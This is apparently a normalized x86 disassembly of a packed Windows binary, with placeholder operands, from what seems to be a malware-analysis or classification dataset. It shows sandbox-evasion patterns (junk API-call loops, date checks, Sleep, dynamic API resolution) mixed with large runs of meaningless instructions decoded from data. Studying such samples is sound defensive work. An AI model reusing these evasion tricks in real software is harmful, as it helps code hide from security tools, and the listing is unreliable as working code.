jpo r-xdata
fsubr [ ebx ]
jpo r-xdata
sbb dl [ esp + edx ]
jpo r-xdata
mov ecx 0xb3
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
jpo r-xdata
jpo r-xdata
add bl [ ebp + 0x7b14140e ]
pushad
jpo r-xdata
adc al 0xd8
jpo r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
jpo r-xdata
jpo r-xdata
push cs
jpo r-xdata
sub eax [ edx ]
jpo r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1e7bdad0
jne r-xdata
call sub_403198
mov ch 0xb0
jpo r-xdata
in al 0x6f
add dl [ esp + edx ]
jpo r-xdata
leave
mov bl 0x81
into
lea esp [ edx - 0x52 ]
or esi [ ebx + 0x29881 ]
popfd
jpo r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
mov ah 0xb5
mov al 0x22
adc al 0x14
or ecx 0x8dce81b3
bound ebp [ esi - 0x677e4cf5 ]
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x8bf1
jne r-xdata
nop
nop
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
push 0x1f
call Sleep
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
push rw-data
call [ rw-data ]
nop
mov edx rw-data
mov eax rw-data
call sub_46bcd8
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x2e
jbe r-xdata
nop
push 0x0
call sub_46bd60
jmp r-xdata
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
sub_470d8d
jmp r-xdata
adc al 0x14
jpo r-xdata
in al 0x7e
sub esp [ edx ]
sub [ ebx + 0x7b ] bh
jpo r-xdata
fcomp [ 0xffffffffa7bc14bd ]
outsb
sub eax [ edx ]
scasd [ edi ]
push eax
adc al 0x14
jpo r-xdata
adc al 0x7b
scasb [ edi ]
pop ds
shr [ esp ] 0x1
outsd
inc ecx
adc dl [ esp + edx ]
jpo r-xdata
pushad
push ss
mov ebp 0xfc022a60
sub edi 0x1437d502
adc al 0x14
jpo r-xdata
mov ebp 0xeb575b60
mov bl 0x81
cwde
jpo r-xdata
and esp [ esi + 0x6e ]
xchg ebx eax
push ss
adc al 0x14
add cl [ ebx ]
cmp [ esp + edx ] edx
jpo r-xdata
add dh [ edx ]
xor eax 0x688d1414
xlat
cli
jmp r-xdata
adc al 0x14
add ebx [ ebp - 0x17 ]
jmp r-xdata
adc dx [ esi ]
add dl ch
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
bound ebp [ esi + 0x3b9f023b ]
adc al 0x14
aaa
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
0x213a260 0x387b
jmp 0x7bc2fa2b
add bh ah
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov [ edx ] es
jpo r-xdata
popad
lea esp [ edx - 0x52 ]
jpo r-xdata
in al 0x6e
jpo r-xdata
push esi
jpo r-xdata
das
[ edi ]
jpo r-xdata
cmp eax [ edx ]
lahf
scasb [ edi ]
jpo r-xdata
jmp r-xdata
in eax dx
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
mov esi [ ecx + 0x628d8981 ]
mov esi 0x628db189
scasb [ edi ]
daa
lea esp [ edx - 0x62 ]
inc edi
pushad
sahf
jecxz r-xdata
add al [ eax ]
jmp r-xdata
pop ebx
mov ebx 0x148f6e66
adc al 0x14
add bh [ eax ]
cmp dl [ esp + edx ]
scasb [ edi ]
jpo r-xdata
jmp r-xdata
sub esi [ ebp + esi * 4 + 0x7b2822b0 ]
jpo r-xdata
adc [ esp + edx ] dl
jmp r-xdata
push edx
cmpsb [ esi ] [ edi ]
mov cl 0xeb
jmp r-xdata
xchg [ edx ] al
and al 0x34
adc al 0x14
jpo r-xdata
add dl [ ebx + 0x7bebebe9 ]
jpo r-xdata
add ebx [ ebx + 0x68ebebeb ]
das
out 0x14 eax
jl r-xdata
adc al 0x14
adc al 0x2
cmp edx [ esp + edx ]
cmp eax 0x143e0002
adc al 0x7b
jpo r-xdata
cwde
sub al 0xae
adc ecx ecx

sub al [ edx ]
jpo r-xdata
and ah ah
jpo r-xdata
jpo r-xdata
lea edx [ esp + edx + 0x14 ]
jpo r-xdata
jle r-xdata
jpo r-xdata
add ah [ edi ]
xor al 0x14
adc al 0x7b
jpo r-xdata
mov dl 0x81
cmp [ edx ] bh
jpo r-xdata
cld
jpo r-xdata
add dl [ esi ]
jpo r-xdata
outsd
xchg edi eax
jpo r-xdata
mov ebx 0x143e3902
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
in al 0x6f
jle r-xdata
adc [ esp + edx ] dl
add ebx ebp
pop ecx
jpo r-xdata
adc al 0x2
push 0x7b14145f
push 0x702ea14
pushad
adc eax 0x2396628d
fcom [ edx + eax ]
test al 0x4
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x81
out dx eax
cli
mov ebp 0x2b021b60
and al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
sub eax [ edx ]
adc eax 0x8d141432
sub al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
push edx
adc al 0x14
mov ebp 0x14180302
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc esi eax
in al 0x6f
loop r-xdata
in al 0x6e
jpo r-xdata
adc al 0x3
jpo r-xdata
sub bl [ esi + ebx * 4 ]
sti
add ch [ ecx ]
xor edx [ esp + edx ]
jpo r-xdata
bound esp [ esi + 0x2d830227 ]
jpo r-xdata
jpo r-xdata
mov esi 0x7680760
out 0x66 eax
scasb [ edi ]
pop ds
mov ebx 0x2ce3ae60
scasb [ edi ]
pop ds
cwde
mov [ edx + 0x13ae2c8e ] eax
pop [ edi - 0xafd3a79 ]
daa
adc al 0x14
jpo r-xdata
add bl [ edx + 0x7b141414 ]
jpo r-xdata
push [ eax ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
adc al 0xbd
jpo r-xdata
jmp r-xdata
jpo r-xdata
sti
sub al 0x14
adc al 0x60
jmp r-xdata
adc al 0xe4
outsd
outsd
sub [ ebx + 0x7b ] bh
das
sub dl [ esp + edx ]
jpo r-xdata
pop es
jpo r-xdata
fstp [ ecx + 0x14 ]
adc al 0x1c
xor esi eax
sub ebp [ ebx + 0x7b7b2822 ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi + 0x22bd81d ]
jb r-xdata
jpo r-xdata
jpo r-xdata
add [ eax ] al
add [ edx ] ch
cmp dl [ ebx ]
sub [ ebx + 0x7b ] bh
adc al 0x7b
scasb [ edi ]
adc esp [ eax + 0x6b ]
dec edi
jmp r-xdata
mov [ fs : eax ] esp
inc [ rw-data ]
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
sub esp esp
outsb
ja r-xdata
jpo r-xdata
jpo r-xdata
pushad
jpo r-xdata
lea eax [ edx ]
jpo r-xdata
add al [ ebx ]
jpo r-xdata
test [ eax + 0x31 ] esp
lea esp [ edx - 0x4a ]
jmp 0x146e2165
jpo r-xdata
adc al [ edx ]
adc al 0x14
pushad
pop es
push 0xe381e707
scasb [ edi ]
pop ds
sub ebx 0x3f602bb
adc al 0x14
jpo r-xdata
adc al 0x14
adc al 0xea
add al [ edi ]
pushad
scasb [ edi ]
jecxz r-xdata
adc al 0x14
lea ebp [ esi + 0x39 ]
in al 0x6f
adc al 0x14
jpo r-xdata
adc al 0x14
sbb al 0x33
push ss
adc al 0x14
add ebp [ esp + ecx - 0x4d4debec ]
add al bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x14171602
adc al 0x7b
jpo r-xdata
dec ecx
adc al 0x14
add dh [ ecx + 0x36 ]
adc al 0x14
jpo r-xdata
adc al 0xb2
outsb
sub esp esp
outsd
xlat
jpo r-xdata
adc eax 0x6eb21414
add edx edi
adc al 0x14
jmp r-xdata
daa
add al [ ebx + 0x7b14142d ]
lea esp [ edx - 0x52 ]
jpo r-xdata
mov eax 0x575b60bd
jpo r-xdata
push 0x0
push 0x0
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
call SetTextAlign
inc [ rw-data ]
jpo r-xdata
adc eax 0xff640047
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
adc al 0x9e
out 0x60 eax
jpo r-xdata
jpo r-xdata
test eax 0x64004712
sahf
sti
add al [ eax ]
or dl [ esp + edx ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
push ss
jpo r-xdata
sbb [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
xor [ ebp + 0x2e9b662 ] ecx
adc [ edi ] ah
jpo r-xdata
and ebx [ ebx + 0x2ccb8799 ]
scasb [ edi ]
cmpsb [ esi ] [ edi ]
sub al 0xae
jpo r-xdata
in al 0x5c
jpo r-xdata
mov esi 0x28c818f
or [ edi - 0x74419d73 ] 0x8d8981b1
bound edi [ esi + 0x628db189 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
add dl [ esi ]
jpo r-xdata
lea esp [ edx - 0x5a ]
sbb eax 0x72022bd8
0x7b7bebeb 0x7b7b
sub [ 0xffffffff8d7b1414 ] 0x62
scasb [ edi ]
jpo r-xdata
jmp r-xdata
pushad
pop ebx
jpo r-xdata
mov [ rw-data ] 0x1004
jmp r-xdata
push ecx
stc
jpo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov [ rw-data ] 0x1
sub [ rw-data ] 0x1
add [ edi + edi * 8 + 0x30 ] ah
jpo r-xdata
sub [ edi + 0x14007302 ] 0x9a027b14
adc al 0x14
adc al 0x7b
jpo r-xdata
mov [ fs : eax ] esp
push [ eax ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jmp sub_4039ac
jpo r-xdata
fsubr [ ebx ]
mov ch 0xb0
and ch [ eax ]
adc al 0x14
jpo r-xdata
push edi
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
sub eax [ ebp + 0x2ca6a6bd ]
sub al 0xae
insd
and edx [ esp + edx ]
jpo r-xdata
pushad
push 0x2bbe32b
bound eax [ esp + edx + 0x14 ]
jpo r-xdata
adc al 0x14
add ch [ ecx + 0x7b14143b ]
jpo r-xdata
bound esi [ esi + 0x271002e9 ]
or ebx 0x66bdbdbd
outsb
lahf
scasb [ edi ]
jpo r-xdata
hlt
mov cl 0x81
jpo r-xdata
and ah ah
jpo r-xdata
lea ebp [ eax + 0x12 ]
jpo r-xdata
pop ss
adc al 0x14
jpo r-xdata
pushad
pop es
mov edx 0x14236d02
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
push edi
jpo r-xdata
push 0x0
push 0x0
call SetTextAlign
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c414
test eax eax
je r-xdata
jpo r-xdata
add dh [ ebx ]
adc al 0x14
jpo r-xdata
jpo r-xdata
pushad
outsd
sub esp ebx
jpo r-xdata
outsb
jpo r-xdata
stc
popad
in eax 0x5d
bound esp [ esi - 0xffd42bd ]
push edi
adc al 0x14
jpo r-xdata
fsubr [ ebx ]
add dl [ 0xffffffff8d141432 ]
adc al 0x14
jpo r-xdata
adc dh [ edi + 0x145ca802 ]
adc al 0xd2
jpo r-xdata
jpo r-xdata
add [ edx + 0x5ae628d ] 0x28d81b3
jecxz r-xdata
jpo r-xdata
daa
adc [ edx - 0x59fd7165 ] 0x35
fwait
cdq
jpo r-xdata
mov esi 0x8981b18b
lea esp [ edx - 0x42 ]
mov [ ecx - 0x70419d73 ] esi
or [ edx + eax + 0x14145626 ] 0x7b7b7b7b
jpo r-xdata
jecxz r-xdata
jpo r-xdata
xchg [ eax - 0x14499d73 ] dh
add [ ebp + 0x628d3160 ] 0x1002e9b6
daa
jpo r-xdata
jpo r-xdata
mov bh 0x2
jpo r-xdata
pop ds
adc al 0x14
add ch [ eax + 0x5f ]
adc al 0x14
jpo r-xdata
jmp r-xdata
jpo r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
nop
jmp r-xdata
cmp [ rw-data ] 0x105
jne r-xdata
add eax rw-data
adc al 0x14
jpo r-xdata
0x7b141414 0x7b7b
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jae r-xdata
and [ ebx + 0x4777a42d ] al
jpo r-xdata
or [ ebp - 0x4cfa519e ] 0x81
mov ebx 0x14446202
adc al 0x7b
jpo r-xdata
outsb
adc edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
out 0x2 eax
outsb
push ecx
add ch [ eax - 0x2debeba4 ]
jpo r-xdata
ja r-xdata
jpo r-xdata
jpo r-xdata
add ah [ edx + 0x44 ]
adc al 0x14
xchg ebx ecx
jpo r-xdata
adc al 0x14
jpo r-xdata
mov cl 0x81
jpo r-xdata
inc edi
jpo r-xdata
movsb [ edi ] [ esi ]
in al 0x6e
jpo r-xdata
adc al 0x14
shl [ esi + 0x516e02e7 ] cl
push 0xa802b712
pop esp
test al 0x5c
push 0xe4ebe796
outsb
add bh [ edi ]
jpo r-xdata
mov [ rw-data ] 0x558
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
call SetTextAlign
jmp r-xdata
add [ eax ] eax
add [ eax ] al
jpo r-xdata
adc al 0x7b
sub eax rw-data
add [ edi ] ecx
cmp ecx 0x2
add [ eax ] al
jpo r-xdata
pop esp
adc al 0x2
jpo r-xdata
pop esp
cli
xchg esi eax
out 0xeb eax
inc [ rw-data ]
cmp [ rw-data ] 0x105
jne r-xdata
add [ ecx + 0x4777b43d ] al
add [ 0x75000001 ] al
in eax 0x68
int3
jpo r-xdata
sub al 0xae
jpo r-xdata
mov [ ebp - 0x4e76419e ] ecx
lea esp [ edx - 0x42 ]
pop [ ecx + 0x5626028c ]
mov ah 0x81
test eax 0x1419f002
push [ fs : eax ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
or [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
mov [ rw-data ] 0x1004
nop
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
adc ebp [ eax ]
jpo r-xdata
ja r-xdata
jpo r-xdata
sti
jpo r-xdata
lea esp [ edx - 0x52 ]
add eax 0x28d81b3
retn 0x4
adc al 0x62
xchg esi eax
pop ss
add ah bh
add [ esp + edx ] edx
mov esp ebp
pop ebp
jpo r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
jpo r-xdata
add bh bl
adc al 0x14
jpo r-xdata
int3
outsb
jpo r-xdata
adc al 0x7b
jpo r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
nop
nop
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x24a4
jne r-xdata
push 0x0
push 0x0
call SetTextAlign
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
jpo r-xdata
nop
mov [ rw-data ] 0x1
add [ eax + 0x77a805c7 ] dl
inc edi
add [ eax + edx ] al
add [ eax ] al
add [ ecx ] al
sub [ ebx + 0x7b ] bh
scasd [ edi ]
adc al 0x14
jpo r-xdata
xchg edx eax
fwait
jpo r-xdata
mov [ eax ] esp
jpo r-xdata
jpo r-xdata
in al 0x6e
jpo r-xdata
adc ebp [ esi + 0x2b ]
jpo r-xdata
jpo r-xdata
mov [ rw-data ] 0x1918
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
nop
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov es [ edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub esp esp
jpo r-xdata
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x89bd
jne r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov eax 0x1e7bdc37
call sub_4026bc
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x0
je r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
xor eax 0x7b7b1414
jpo r-xdata
movsb [ edi ] [ esi ]
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
outsb
jpo r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
jpo r-xdata
adc al 0x14
jpo r-xdata
push 0x7f02fb2f
sub [ esp + edx ] dl
jpo r-xdata
inc edi
jpo r-xdata
jpo r-xdata
fsubr [ ebx ]
jpo r-xdata
sbb dl [ esp + edx ]
jpo r-xdata
mov ecx 0xb3
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
jpo r-xdata
jpo r-xdata
add bl [ ebp + 0x7b14140e ]
pushad
jpo r-xdata
adc al 0xd8
jpo r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
jpo r-xdata
jpo r-xdata
push cs
jpo r-xdata
sub eax [ edx ]
jpo r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1e7bdad0
jne r-xdata
call sub_403198
mov ch 0xb0
jpo r-xdata
in al 0x6f
add dl [ esp + edx ]
jpo r-xdata
leave
mov bl 0x81
into
lea esp [ edx - 0x52 ]
or esi [ ebx + 0x29881 ]
popfd
jpo r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
mov ah 0xb5
mov al 0x22
adc al 0x14
or ecx 0x8dce81b3
bound ebp [ esi - 0x677e4cf5 ]
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x8bf1
jne r-xdata
nop
nop
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
push 0x1f
call Sleep
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
push rw-data
call [ rw-data ]
nop
mov edx rw-data
mov eax rw-data
call sub_46bcd8
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x2e
jbe r-xdata
nop
push 0x0
call sub_46bd60
jmp r-xdata
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
sub_471079
push 0x6ee4c011
in eax dx
jmp r-xdata
jmp r-xdata
adc [ esp + edx ] dl
mov ebx 0x143e3902
adc al 0x7b
jpo r-xdata
and ah ah
jpo r-xdata
add dl [ esi ]
jpo r-xdata
outsd
xchg edi eax
jpo r-xdata
jpo r-xdata
sub eax [ edx ]
adc eax 0x8d141432
sub al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
push edx
adc al 0x14
mov ebp 0x14180302
adc al 0x7b
jpo r-xdata
jpo r-xdata
add bl [ edx + 0x7b141414 ]
jpo r-xdata
push [ eax ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
adc al 0xbd
jpo r-xdata
add [ eax ] al
add [ edx ] ch
cmp dl [ ebx ]
sub [ ebx + 0x7b ] bh
adc al 0x7b
scasb [ edi ]
adc esp [ eax + 0x6b ]
dec edi
jmp r-xdata
mov [ fs : eax ] esp
inc [ rw-data ]
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
sub esp esp
outsb
ja r-xdata
jpo r-xdata
jpo r-xdata
pushad
jpo r-xdata
lea eax [ edx ]
jpo r-xdata
add al [ ebx ]
jpo r-xdata
push 0x0
push 0x0
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
call SetTextAlign
inc [ rw-data ]
jpo r-xdata
adc eax 0xff640047
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
adc al 0x9e
out 0x60 eax
jpo r-xdata
jpo r-xdata
test eax 0x64004712
sahf
sti
add al [ eax ]
or dl [ esp + edx ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
push ss
jpo r-xdata
sbb [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
mov [ rw-data ] 0x1004
jmp r-xdata
push ecx
stc
jpo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov [ rw-data ] 0x1
sub [ rw-data ] 0x1
add [ edi + edi * 8 + 0x30 ] ah
jpo r-xdata
sub [ edi + 0x14007302 ] 0x9a027b14
adc al 0x14
adc al 0x7b
jpo r-xdata
mov [ fs : eax ] esp
push [ eax ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jmp sub_4039ac
jpo r-xdata
fsubr [ ebx ]
mov ch 0xb0
and ch [ eax ]
adc al 0x14
jpo r-xdata
push edi
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
sub eax [ ebp + 0x2ca6a6bd ]
sub al 0xae
insd
and edx [ esp + edx ]
jpo r-xdata
pushad
push 0x0
push 0x0
call SetTextAlign
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c414
test eax eax
je r-xdata
jpo r-xdata
add dh [ ebx ]
adc al 0x14
jpo r-xdata
jpo r-xdata
pushad
outsd
sub esp ebx
jpo r-xdata
outsb
jpo r-xdata
stc
popad
in eax 0x5d
bound esp [ esi - 0xffd42bd ]
push edi
adc al 0x14
jpo r-xdata
fsubr [ ebx ]
add dl [ 0xffffffff8d141432 ]
adc dh [ edi + 0x145ca802 ]
adc al 0xd2
jpo r-xdata
and ebx [ ebx + 0x2ccb8799 ]
scasb [ edi ]
cmpsb [ esi ] [ edi ]
sub al 0xae
jpo r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
nop
jmp r-xdata
cmp [ rw-data ] 0x105
jne r-xdata
add eax rw-data
jpo r-xdata
adc al 0x14
jpo r-xdata
0x7b141414 0x7b7b
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jae r-xdata
and [ ebx + 0x4777a42d ] al
jpo r-xdata
jecxz r-xdata
jpo r-xdata
or [ ebp - 0x4cfa519e ] 0x81
mov ebx 0x14446202
adc al 0x7b
jpo r-xdata
outsb
adc edx [ esp + edx ]
jpo r-xdata
pushad
scasb [ edi ]
jecxz r-xdata
xchg [ eax - 0x14499d73 ] dh
add [ ebp + 0x628d3160 ] 0x1002e9b6
daa
cmpsb [ esi ] [ edi ]
out 0x2 eax
outsb
push ecx
add ch [ eax - 0x2debeba4 ]
jpo r-xdata
scasb [ edi ]
jpo r-xdata
mov [ rw-data ] 0x558
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
call SetTextAlign
jmp r-xdata
ja r-xdata
jpo r-xdata
add [ eax ] eax
add [ eax ] al
jpo r-xdata
adc al 0x7b
sub eax rw-data
add [ edi ] ecx
cmp ecx 0x2
add [ eax ] al
jpo r-xdata
inc edi
jpo r-xdata
pop esp
adc al 0x2
jpo r-xdata
adc al 0xe4
outsd
outsd
pop ds
adc al 0x14
add ch [ eax + 0x5f ]
adc al 0x14
jpo r-xdata
sub [ ebx + 0x7b ] bh
push 0x2bbe32b
bound eax [ esp + edx + 0x14 ]
jpo r-xdata
pop esp
cli
xchg esi eax
out 0xeb eax
daa
adc [ edx - 0x59fd7165 ] 0x35
fwait
cdq
jpo r-xdata
mov [ rw-data ] 0x1004
nop
mov [ rw-data ] 0x1
jmp r-xdata
inc [ rw-data ]
cmp [ rw-data ] 0x105
jne r-xdata
add [ ecx + 0x4777b43d ] al
add [ 0x75000001 ] al
in eax 0x68
int3
jpo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
adc ebp [ eax ]
jpo r-xdata
ja r-xdata
jpo r-xdata
push [ fs : eax ]
jpo r-xdata
sti
jpo r-xdata
pop es
push 0xe381e707
scasb [ edi ]
pop ds
sub ebx 0x3f602bb
adc al 0x14
jpo r-xdata
adc al 0xea
add al [ edi ]
adc al 0x14
jmp r-xdata
jpo r-xdata
add [ edx + 0x5ae628d ] 0x28d81b3
jecxz r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg ebx ecx
jpo r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
nop
nop
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x24a4
jne r-xdata
push 0x0
push 0x0
call SetTextAlign
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
lea esp [ edx - 0x52 ]
add eax 0x28d81b3
retn 0x4
adc al 0x62
xchg esi eax
pop ss
add ah bh
add [ esp + edx ] edx
mov esp ebp
pop ebp
jpo r-xdata
nop
mov [ rw-data ] 0x1
add [ eax + 0x77a805c7 ] dl
inc edi
add [ eax + edx ] al
add [ eax ] al
add [ ecx ] al
sub [ ebx + 0x7b ] bh
scasd [ edi ]
xor [ ecx + ecx * 4 + 0x20 ] ah
jpo r-xdata
adc al 0x14
jpo r-xdata
sub bl [ esi + ebx * 4 ]
sti
add ch [ ecx ]
xor edx [ esp + edx ]
jpo r-xdata
bound esp [ esi + 0x2d830227 ]
adc al 0x14
jpo r-xdata
jpo r-xdata
test [ eax + 0x31 ] esp
lea esp [ edx - 0x4a ]
jmp 0x146e2165
jpo r-xdata
jpo r-xdata
add ah [ edx + 0x44 ]
adc al 0x14
and ah ah
jpo r-xdata
adc al 0x14
jpo r-xdata
lea ebp [ eax + 0x12 ]
sub al 0xae
jpo r-xdata
mov [ rw-data ] 0x1918
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
nop
jmp r-xdata
mov [ eax ] esp
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi + 0x22bd81d ]
jb r-xdata
adc al 0x14
add ch [ ecx + 0x7b14143b ]
jpo r-xdata
xor [ ebp + 0x2e9b662 ] ecx
adc [ edi ] ah
jpo r-xdata
jpo r-xdata
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x89bd
jne r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov eax 0x1e7bdc37
call sub_4026bc
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x0
je r-xdata
jpo r-xdata
jpo r-xdata
mov eax 0x14171602
adc al 0x7b
jpo r-xdata
adc al 0xb2
outsb
sub esp esp
outsd
dec ecx
adc al 0x14
add dh [ ecx + 0x36 ]
adc al 0x14
jpo r-xdata
xlat
jpo r-xdata
adc eax 0x6eb21414
add edx edi
jpo r-xdata
adc al 0x14
jmp r-xdata
bound esi [ esi + 0x271002e9 ]
or ebx 0x66bdbdbd
outsb
lahf
xchg edx eax
fwait
jpo r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
movsb [ edi ] [ esi ]
jpo r-xdata
jpo r-xdata
in al 0x6e
jpo r-xdata
add dl [ esi ]
jpo r-xdata
lea esp [ edx - 0x5a ]
daa
add al [ ebx + 0x7b14142d ]
lea esp [ edx - 0x52 ]
sbb eax 0x72022bd8
0x7b7bebeb 0x7b7b
mov es [ edx ]
jpo r-xdata
mov ecx 0xb3
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
inc edi
jpo r-xdata
das
sub dl [ esp + edx ]
jpo r-xdata
jpo r-xdata
pop ss
adc al 0x14
jpo r-xdata
pushad
pop es
mov edx 0x14236d02
adc al 0x7b
jpo r-xdata
cmpsb [ esi ] [ edi ]
xor eax 0x7b7b1414
jpo r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
jpo r-xdata
adc al 0x14
lea ebp [ esi + 0x39 ]
in al 0x6f
pop es
adc al 0x14
in al 0x5c
hlt
jpo r-xdata
jpo r-xdata
mov bh 0x2
jpo r-xdata
adc al 0x14
jpo r-xdata
push 0x7f02fb2f
sub [ esp + edx ] dl
jpo r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1e7bdad0
